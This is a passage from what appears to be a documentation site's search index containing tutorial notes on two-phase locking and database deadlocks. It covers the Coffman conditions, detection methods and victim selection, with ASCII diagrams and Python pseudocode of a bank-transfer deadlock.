\u25cf\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25cf                                      \u2502\n\u2502   \u2502 All acquired \u2502                                      \u2502\n\u2502   \u2502 immediately  \u2502                                      \u2502\n\u2502   BEGIN        COMMIT                                   \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Decision Matrix:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502         WHICH 2PL TYPE TO USE?                          \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 Use STRICT 2PL when:                                    \u2502\n\u2502 \u2022 Building a general-purpose database \u2b50                \u2502\n\u2502 \u2022 Need good balance of safety and performance           \u2502\n\u2502 \u2022 Industry-standard behavior expected                   \u2502\n\u2502 \u2022 Most common choice (90% of cases)                     \u2502\n\u2502                                                         \u2502\n\u2502 Use RIGOROUS 2PL when:                                  \u2502\n\u2502 \u2022 Absolute correctness is paramount                     \u2502\n\u2502 \u2022 Financial/legal compliance required                   \u2502\n\u2502 \u2022 Low contention workload                               \u2502\n\u2502 \u2022 Simplicity more important than performance            \u2502\n\u2502                                                         \u2502\n\u2502 Use CONSERVATIVE 2PL when:                              \u2502\n\u2502 \u2022 Batch processing with known resources                 \u2502\n\u2502 \u2022 Deadlocks absolutely cannot occur                     \u2502\n\u2502 \u2022 Can declare all locks upfront                         \u2502\n\u2502 \u2022 Predictable execution required                        \u2502\n\u2502                                                         \u2502\n\u2502 Use BASIC 2PL when:                                     \u2502\n\u2502 \u2022 Rarely! (Theoretical interest only)                   \u2502\n\u2502 \u2022 Research/academic settings                            \u2502\n\u2502 \u2022 Special cases with custom recovery                    \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"system-design/high-level/concepts/ditributed-transaction-and-concurrency-control/#5-deadlock-problem-in-concurrency-control","title":"5. Deadlock Problem in Concurrency Control","text":"<p>Description:</p> <p>A deadlock is a situation where two or more transactions are permanently blocked because each is waiting for resources held by the other. This creates a circular dependency where no transaction can proceed. Understanding deadlocks and their solutions is critical for building robust concurrent systems.</p>"},{"location":"system-design/high-level/concepts/ditributed-transaction-and-concurrency-control/#51-deadlock-in-pessimistic-concurrency-control","title":"5.1 Deadlock in Pessimistic Concurrency Control","text":"<p>Description:</p> <p>In pessimistic concurrency control, deadlocks occur when transactions acquire locks in different orders, creating a circular wait condition. This is one of the most common and serious problems with lock-based concurrency control.</p> <p>The Deadlock Paradox:</p> <p>Deadlocks represent one of the most frustrating ironies in computer systems: we introduce locks to ensure safety, but locks themselves create a new problem - mutual starvation. Two transactions, each trying to do the right thing (acquiring locks before accessing data), end up permanently blocking each other. Neither can proceed, neither will release resources, and without external intervention, they would wait forever.</p> <p>Historical Context:</p> <p>Deadlocks aren't unique to databases - they were first studied in operating systems in the 1960s when multiple processes competed for resources like printers, tape drives, and memory. The famous \"Dining Philosophers Problem\" (proposed by Edsger Dijkstra in 1965) elegantly illustrates deadlock: five philosophers sit at a round table, each needs two forks to eat, but there are only five forks total. If each picks up the fork to their left simultaneously, they deadlock.</p> <p>E.W. Dijkstra's work on deadlocks led to the formulation of the four Coffman Conditions (named after Edward G. Coffman Jr., 1971) - the necessary and sufficient conditions for deadlock. Understanding these conditions is crucial because preventing deadlock means breaking at least one condition.</p> <p>Why Deadlocks are Particularly Problematic in Databases:</p> <ol> <li> <p>Dynamic Resource Requests: Unlike operating systems where processes declare resources upfront, database transactions dynamically request locks based on query execution paths, making deadlocks harder to predict.</p> </li> <li> <p>High Concurrency: Modern databases handle thousands of concurrent transactions. With N transactions, there are potentially N\u00b2 lock conflicts, making deadlocks statistically likely.</p> </li> <li> <p>User-Facing Impact: A deadlock that aborts a transaction means:</p> </li> <li>User sees an error message</li> <li>Application must retry (added latency)</li> <li>Potential data loss if retry fails</li> <li> <p>Poor user experience</p> </li> <li> <p>Complex Lock Dependencies: Transactions may lock hundreds of rows across multiple tables, creating complex dependency graphs where cycles (deadlocks) can hide.</p> </li> </ol> <p>Real-World Deadlock Statistics:</p> <p>Studies of production database systems reveal: - Frequency: Systems with high concurrency experience 1-5% deadlock rate - Cost: Each deadlock wastes 10-100ms of work (rollback + retry) - Cascading Effects: Deadlocks can trigger lock queue pile-ups affecting unrelated transactions - Financial Impact: In high-frequency trading, a single deadlock can mean missing a market opportunity worth thousands</p> <p>The Detection Challenge:</p> <p>Detecting deadlocks isn't trivial. Databases typically use one of two approaches:</p> <ol> <li>Wait-For Graph (used by PostgreSQL, Oracle):</li> <li>Maintain graph: T1 \u2192 T2 means T1 waits for lock held by T2</li> <li>Periodically scan for cycles (expensive: O(N\u00b2) for N transactions)</li> <li>Cycle = deadlock detected</li> <li> <p>Trade-off: Detection overhead vs. detection latency</p> </li> <li> <p>Timeout-Based (used by MySQL InnoDB):</p> </li> <li>If lock wait exceeds threshold (e.g., 50 seconds), assume deadlock</li> <li>Simpler but can false-positive (slow transaction \u2260 deadlock)</li> <li>Trade-off: Simplicity vs. accuracy</li> </ol> <p>Victim Selection - Who Gets Aborted?</p> <p>When a deadlock is detected, one transaction must be chosen as the victim and aborted. Databases use sophisticated algorithms:</p> <pre><code>Victim Selection Criteria (weighted):\n1. Transaction age (prefer aborting younger transactions)\n2. Number of locks held (prefer aborting those with fewer locks)\n3. Amount of work done (prefer aborting those that did less)\n4. Number of previous aborts (fairness - avoid starvation)\n5. Transaction priority (user-specified, if available)\n</code></pre> <p>Poor victim selection can lead to cascading rollbacks where aborting one transaction forces others to abort.</p> <p>Real-World Impact Story:</p> <p>In 2018, a major e-commerce platform experienced a deadlock storm during Black Friday: - High traffic triggered thousands of concurrent checkout transactions - Each transaction locked: cart items, inventory, user profile, payment record - Lock acquisition order varied based on cart contents (not sorted) - Result: 30% of transactions deadlocked, had to retry - Impact: $500K in lost sales (customers abandoned carts after errors) - Fix: Implemented strict lock ordering by primary key</p> <p>This illustrates why deadlock prevention isn't just academic - it has real business impact.</p> <p>What is Deadlock:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502                 DEADLOCK DEFINITION                     \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502  A deadlock occurs when:                                \u2502\n\u2502                                                         \u2502\n\u2502  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510        \u2502\n\u2502  \u2502 1. T1 holds Lock A, waits for Lock B       \u2502        \u2502\n\u2502  \u2502 2. T2 holds Lock B, waits for Lock A       \u2502        \u2502\n\u2502  \u2502                                            \u2502        \u2502\n\u2502  \u2502 Result: CIRCULAR WAIT                      \u2502        \u2502\n\u2502  \u2502         Both transactions BLOCKED forever  \u2502        \u2502\n\u2502  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518        \u2502\n\u2502                                                         \u2502\n\u2502  Without intervention, neither can proceed!             \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Deadlock Scenario - Visual Diagram:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502          CLASSIC DEADLOCK SCENARIO                      \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502  Time    T1                    T2                       \u2502\n\u2502  \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500       \u2502\n\u2502  t1      BEGIN                                          \u2502\n\u2502  t2                            BEGIN                    \u2502\n\u2502  t3      LOCK(A) \u2713                                      \u2502\n\u2502          [A locked by T1] \ud83d\udd12                            \u2502\n\u2502  t4                            LOCK(B) \u2713                \u2502\n\u2502                                [B locked by T2] \ud83d\udd12      \u2502\n\u2502  t5      LOCK(B) \u274c WAIT                                \u2502\n\u2502          [T1 waiting for B...]                          \u2502\n\u2502  t6                            LOCK(A) \u274c WAIT          \u2502\n\u2502                                [T2 waiting for A...]    \u2502\n\u2502  t7      [STILL WAITING] \u23f3                             \u2502\n\u2502  t8                            [STILL WAITING] \u23f3       \u2502\n\u2502  t9      \ud83d\udc80 DEADLOCK DETECTED \ud83d\udc80                        \u2502\n\u2502                                                         \u2502\n\u2502  Circular Dependency:                                   \u2502\n\u2502  \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510              \u2502\n\u2502  \u2502  T1 \u2192 waits for \u2192 B (held by T2)     \u2502              \u2502\n\u2502  \u2502   \u2191                           \u2193      \u2502              \u2502\n\u2502  \u2502   \u2502                           \u2502      \u2502              \u2502\n\u2502  \u2502   \u2514\u2500\u2500\u2500\u2500\u2500\u2500 held by T1 \u2190 A \u2190\u2500\u2500\u2500\u2500\u2518      \u2502              \u2502\n\u2502  \u2502                                      \u2502              \u2502\n\u2502  \u2502  CYCLE = DEADLOCK!                   \u2502              \u2502\n\u2502  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518              \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Resource Allocation Graph:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502        DEADLOCK - RESOURCE ALLOCATION GRAPH             \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502  Transactions: T1, T2                                   \u2502\n\u2502  Resources: Row A, Row B                                \u2502\n\u2502                                                         \u2502\n\u2502                    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                            \u2502\n\u2502             \u250c\u2500\u2500\u2500\u2500\u2500\u2192\u2502 Row A \u2502\u2500\u2500\u2500\u2500\u2500\u2500\u2510                     \u2502\n\u2502             \u2502      \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518      \u2502                     \u2502\n\u2502             \u2502                     \u2193                     \u2502\n\u2502         Request                 Holds                   \u2502\n\u2502             \u2502                     \u2502                     \u2502\n\u2502         \u250c\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2510             \u250c\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2510                \u2502\n\u2502         \u2502  T1   \u2502             \u2502  T2   \u2502                \u2502\n\u2502         \u2514\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2518             \u2514\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2518                \u2502\n\u2502             \u2502                     \u2502                     \u2502\n\u2502           Holds                Request                  \u2502\n\u2502             \u2502                     \u2502                     \u2502\n\u2502             \u2193                     \u2193                     \u2502\n\u2502         \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510             \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510                \u2502\n\u2502         \u2502 Row B \u2502\u2190\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2502 Row B \u2502                \u2502\n\u2502         \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518             \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518                \u2502\n\u2502                                                         \u2502\n\u2502  Cycle detected: T1 \u2192 A \u2192 T2 \u2192 B \u2192 T1                  \u2502\n\u2502                  (DEADLOCK!)                            \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Detailed Timeline Example:</p> <pre><code>Banking Transfer Deadlock:\n\nT1: Transfer $100 from Account A to Account B\nT2: Transfer $200 from Account B to Account A\n\nTime  T1 Actions                 T2 Actions              State\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nt1    BEGIN                                               -\nt2                                BEGIN                   -\nt3    SELECT ... FROM A                                   \n      FOR UPDATE                                          \n      \u2192 LOCK(A) acquired \ud83d\udd12                              A: locked by T1\nt4                                SELECT ... FROM B       \n                                  FOR UPDATE             \n                                  \u2192 LOCK(B) acquired \ud83d\udd12  B: locked by T2\nt5    SELECT ... FROM B                                   \n      FOR UPDATE                                          \n      \u2192 Waits for T2 to release B \u23f3                     T1: WAITING\nt6                                SELECT ... FROM A       \n                                  FOR UPDATE             \n                                  \u2192 Waits for T1 to       T2: WAITING\n                                    release A \u23f3          \nt7    [Waiting for B...]          [Waiting for A...]     DEADLOCK! \ud83d\udc80\nt8    Database detects cycle                             \nt9    T1 ABORTED (victim)         [Released, continues]  T2 succeeds\nt10   T1 receives error                                  T1 must retry\n      \"Deadlock detected\"\n</code></pre> <p>Four Conditions for Deadlock (Coffman Conditions):</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502         FOUR CONDITIONS FOR DEADLOCK                    \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 ALL four must be present simultaneously:                \u2502\n\u2502                                                         \u2502\n\u2502 1. MUTUAL EXCLUSION                                     \u2502\n\u2502    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u2502\n\u2502    \u2502 Resource can be held by only ONE     \u2502            \u2502\n\u2502    \u2502 transaction at a time                \u2502            \u2502\n\u2502    \u2502 (Exclusive locks)                    \u2502            \u2502\n\u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518            \u2502\n\u2502                                                         \u2502\n\u2502 2. HOLD AND WAIT                                        \u2502\n\u2502    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u2502\n\u2502    \u2502 Transaction holds resources while    \u2502            \u2502\n\u2502    \u2502 waiting to acquire more              \u2502            \u2502\n\u2502    \u2502 (T1 holds A, waits for B)            \u2502            \u2502\n\u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518            \u2502\n\u2502                                                         \u2502\n\u2502 3. NO PREEMPTION                                        \u2502\n\u2502    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u2502\n\u2502    \u2502 Resources cannot be forcibly taken   \u2502            \u2502\n\u2502    \u2502 from a transaction                   \u2502            \u2502\n\u2502    \u2502 (Locks held until commit/rollback)   \u2502            \u2502\n\u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518            \u2502\n\u2502                                                         \u2502\n\u2502 4. CIRCULAR WAIT                                        \u2502\n\u2502    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510            \u2502\n\u2502    \u2502 Circular chain of transactions       \u2502            \u2502\n\u2502    \u2502 each waiting for resource held       \u2502            \u2502\n\u2502    \u2502 by the next                          \u2502            \u2502\n\u2502    \u2502 (T1\u2192A\u2192T2\u2192B\u2192T1)                       \u2502            \u2502\n\u2502    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518            \u2502\n\u2502                                                         \u2502\n\u2502 Break ANY one condition \u2192 Prevent deadlock              \u2502\n\u2502                                                         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Pseudo Code - Deadlock Example:</p> <pre><code># Example: Classic Deadlock Scenario\n\ndef transaction_1(db):\n    \"\"\"Transfer from Account A to Account B\"\"\"\n    db.begin()\n\n    print(\"T1: Acquiring lock on Account A\")\n    # Step 1: Lock Account A\n    balance_a = db.execute(\"\"\"\n        SELECT balance FROM accounts WHERE id = 'A' FOR UPDATE\n    \"\"\").fetchone()[0]\n    print(\"T1: \u2713 Locked Account A\")\n\n    time.sleep(1)  # Simulate some processing\n\n    print(\"T1: Acquiring lock on Account B\")\n    # Step 2: Try to lock Account B (T2 might have it!)\n    balance_b = db.execute(\"\"\"\n        SELECT balance FROM accounts WHERE id = 'B' FOR UPDATE\n    \"\"\").fetchone()[0]\n    # \u2191 DEADLOCK! If T2 holds B and waits for A\n    print(\"T1: \u2713 Locked Account B\")\n\n    # Transfer\n    db.execute(\"UPDATE accounts SET balance = balance - 100 WHERE id = 'A'\")\n    db.execute(\"UPDATE accounts SET balance = balance + 100 WHERE id = 'B'\")\n\n    db.commit()\n    print(\"T1: Committed\")\n\n\ndef transaction_2(db):\n    \"\"\"Transfer from Account B to Account A (opposite order!)\"\"\"\n    db.begin()\n\n    print(\"T2: Acquiring lock on Account B\")\n    # Step 1: Lock Account B\n    balance_b = db.execute(\"\"\"\n        SELECT balance FROM accounts WHERE id = 'B' FOR UPDATE\n    \"\"\").fetchone()[0]\n    print(\"T2: \u2713 Locked Account B\")\n\n    time.sleep(1)  # Simulate some processing\n\n    print(\"T2: Acquiring lock on Account A\")\n    # Step 2: Try to lock Account A (T1 might have it!)\n    balance_a = db.execute(\"\"\"\n        SELECT balance FROM accounts WHERE id = 'A' FOR UPDATE\n    \"\"\").fetchone()[0]\n    # \u2191 DEADLOCK! If T1 holds A and waits for B\n    print(\"T2: \u2713 Locked Account A\")\n\n    # Transfer\n    db.execute(\"UPDATE accounts SET balance = balance - 200 WHERE id = 'B'\")\n    db.execute(\"UPDATE accounts SET balance = balance + 200 WHERE id = 'A'\")\n\n    db.commit()\n    print(\"T2: Committed\")\n\n# Running both concurrently \u2192 DEADLOCK!\n</code></pre> <p>Deadlock Solutions for Pessimistic Control:</p> <p>Solution 1: Lock Ordering (Prevention)</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502         SOLUTION 1: LOCK ORDERING (Prevention)          \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502                                                         \u2502\n\u2502 Strategy: Always acquire locks in the SAME ORDER        \u2502\n\u2502                                                         \u2502\n\u2502 Rule: Lock resources in ascending order (A before B)    \u2502\n\u2502                                                         \u2502\n\u2502 Before (Deadlock):                                      \u2502\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510           \u2502\n\u2502 \u2502 T1: Lock A \u2192 Lock B                      \u2502           \u2502\n\u2502 \u2502 T2: Lock B \u2192 Lock A  \u274c (opposite order) \u2502           \u2502\n\u2502 \u2502 Result: DEADLOCK                         \u2502           \u2502\n\u2502 